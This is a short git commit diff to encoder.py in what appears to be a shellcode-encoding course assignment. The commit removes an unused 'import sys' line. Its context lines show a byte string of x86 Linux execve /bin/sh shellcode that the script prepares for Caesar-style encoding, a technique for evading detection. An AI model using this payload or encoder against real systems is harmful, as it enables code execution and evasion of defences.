a762b2b861cf400d19bd5980f604ee16a31ae58f
Kevin Kirsche <kev.kirsche@gmail.com>
2018-08-27 13:05:48 -0400

    Update encoder.py

--- assignment_4-custom_encoding/nasm/two_byte_shift_encoder/encoder.py
+++ assignment_4-custom_encoding/nasm/two_byte_shift_encoder/encoder.py
@@ -1,8 +1,6 @@
 #!/usr/bin/env python
 
 # Python Multi-Shift Caesar Cipher
-import sys
-
 shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
 shellcode_bytes = bytearray(shellcode)
 shellcode_len = len(shellcode_bytes)
